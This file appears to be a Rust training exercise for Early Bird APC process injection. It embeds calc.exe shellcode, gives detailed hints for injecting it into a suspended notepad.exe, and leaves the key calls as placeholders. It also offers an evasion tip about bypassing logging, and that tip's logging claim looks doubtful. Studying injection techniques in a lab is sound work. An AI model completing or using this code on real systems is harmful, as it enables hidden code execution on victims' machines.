use std::ffi::c_void;
use std::mem;
use windows::Win32::Foundation::{GetLastError, INFINITE};
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx,
};
use windows::Win32::System::Threading::{
    CreateProcessA, CREATE_SUSPENDED, PAPCFUNC, PROCESS_INFORMATION,
    QueueUserAPC, ResumeThread, STARTUPINFOA, WaitForSingleObject,
};
use windows::core::PCSTR;

// x64 calc.exe shellcode (msfvenom -p windows/x64/exec CMD=calc.exe -f rust)
// Replace with freshly generated shellcode for actual testing on your VM.
const SHELLCODE: &[u8] = &[
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
    0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
    0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
    0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
    0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
    0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
    0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
    0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
    0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
    0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
    0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
    0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
    0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
    0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
    0x63, 0x00,
];

fn main() {
    unsafe {
        // Step 1 — Launch notepad.exe in a suspended state.
        // Use CREATE_SUSPENDED so the main thread hasn't executed any instructions yet.
        // This is the key to the Early Bird pattern: the APC is queued before NtTestAlert
        // is called during thread initialization, guaranteeing it will fire on resume.
        //
        // Hint: CreateProcessA(
        //     lpapplicationname: PCSTR,                              // b"notepad.exe\0"
        //     lpcommandline: PSTR,                                   // None
        //     lpprocessattributes: Option<*const SECURITY_ATTRIBUTES>, // None
        //     lpthreadattributes: Option<*const SECURITY_ATTRIBUTES>,  // None
        //     binherithandles: BOOL,                                 // false
        //     dwcreationflags: PROCESS_CREATION_FLAGS,               // CREATE_SUSPENDED
        //     lpenvironment: Option<*const c_void>,                  // None
        //     lpcurrentdirectory: PCSTR,                             // None
        //     lpstartupinfo: *const STARTUPINFOA,                    // &si (cb must be set)
        //     lpprocessinformation: *mut PROCESS_INFORMATION,        // &mut pi
        // ) -> Result<()>
        let mut si = STARTUPINFOA {
            cb: mem::size_of::<STARTUPINFOA>() as u32,
            ..Default::default()
        };
        let mut pi = PROCESS_INFORMATION::default();
        todo!("call CreateProcessA for notepad.exe with CREATE_SUSPENDED");
        // pi.hProcess — open handle to the suspended notepad process
        // pi.hThread  — open handle to the suspended main thread (this is where the APC goes)

        // Step 2 — Allocate RWX memory in the remote process for the shellcode.
        //
        // Hint: VirtualAllocEx(
        //     hprocess: HANDLE,                          // pi.hProcess
        //     lpaddress: Option<*const c_void>,          // None — let the OS choose
        //     dwsize: usize,                             // SHELLCODE.len()
        //     flallocationtype: VIRTUAL_ALLOCATION_TYPE, // MEM_COMMIT | MEM_RESERVE
        //     flprotect: PAGE_PROTECTION_FLAGS,          // PAGE_EXECUTE_READWRITE
        // ) -> *mut c_void                               // NULL on failure; check it
        let remote_buf: *mut c_void = todo!("VirtualAllocEx(pi.hProcess, None, SHELLCODE.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)");
        if remote_buf.is_null() {
            panic!("VirtualAllocEx failed: {:?}", GetLastError());
        }

        // Step 3 — Write the shellcode into the remote allocation.
        //
        // Hint: WriteProcessMemory(
        //     hprocess: HANDLE,                               // pi.hProcess
        //     lpbaseaddress: *const c_void,                   // remote_buf
        //     lpbuffer: *const c_void,                        // SHELLCODE.as_ptr() as *const c_void
        //     nsize: usize,                                   // SHELLCODE.len()
        //     lpnumberofbyteswritten: Option<*mut usize>,     // None
        // ) -> Result<()>
        todo!("WriteProcessMemory: copy SHELLCODE into remote_buf");

        // Step 4 — Queue an APC to the suspended main thread pointing at the shellcode.
        // PAPCFUNC is Option<unsafe extern "system" fn(usize)>. Transmute the remote
        // pointer to this type. The APC will fire when the thread becomes alertable — for
        // a suspended process created with CREATE_SUSPENDED, that happens the moment you
        // call ResumeThread, during the CRT's first call to NtTestAlert.
        //
        // Hint: QueueUserAPC(
        //     pfnapc: PAPCFUNC,     // transmute(remote_buf) — cast to fn pointer type
        //     hthread: HANDLE,      // pi.hThread — the suspended main thread
        //     dwdata: usize,        // 0 — argument passed to the APC routine (unused here)
        // ) -> u32                  // 0 = failure (check GetLastError); non-zero = success
        let apc_func: PAPCFUNC = todo!("mem::transmute(remote_buf) into PAPCFUNC");
        let result = todo!("QueueUserAPC(apc_func, pi.hThread, 0)");
        if result == 0 {
            panic!("QueueUserAPC failed: {:?}", GetLastError());
        }

        // Step 5 — Resume the suspended thread.
        // The APC fires almost immediately during thread initialization (before any user
        // code in notepad.exe runs). From an observer's perspective: no new thread appears,
        // the shellcode executes inside notepad's existing main thread.
        //
        // Hint: ResumeThread(
        //     hthread: HANDLE,  // pi.hThread
        // ) -> u32              // previous suspend count (1 = was suspended); 0xFFFFFFFF on failure
        let prev_count = todo!("ResumeThread(pi.hThread)");
        assert_ne!(prev_count, u32::MAX, "ResumeThread failed");

        // Step 6 — Wait for the process to finish.
        //
        // Hint: WaitForSingleObject(
        //     hhandle: HANDLE,      // pi.hProcess
        //     dwmilliseconds: u32,  // INFINITE
        // ) -> WIN32_ERROR
        todo!("WaitForSingleObject(pi.hProcess, INFINITE)");

        // --- BONUS: NtQueueApcThread (ntapi variant) ---
        // The Windows API QueueUserAPC is a wrapper around the NT function NtQueueApcThread.
        // Using the NT function directly bypasses one layer of the stack and avoids the
        // Win32 event log entry that QueueUserAPC generates.
        //
        // Signature (ntapi::ntpsapi):
        // NtQueueApcThread(
        //     ThreadHandle:  HANDLE,           // pi.hThread
        //     ApcRoutine:    PPS_APC_ROUTINE,  // transmute(remote_buf) — same as PAPCFUNC
        //     ApcArgument1:  PVOID,            // 0 as *mut c_void
        //     ApcArgument2:  PVOID,            // 0 as *mut c_void
        //     ApcArgument3:  PVOID,            // 0 as *mut c_void
        // ) -> i32 (NTSTATUS)                  // 0 = STATUS_SUCCESS
        //
        // If you want to try this, replace step 4 with NtQueueApcThread and observe
        // whether the behaviour differs.
    }
}
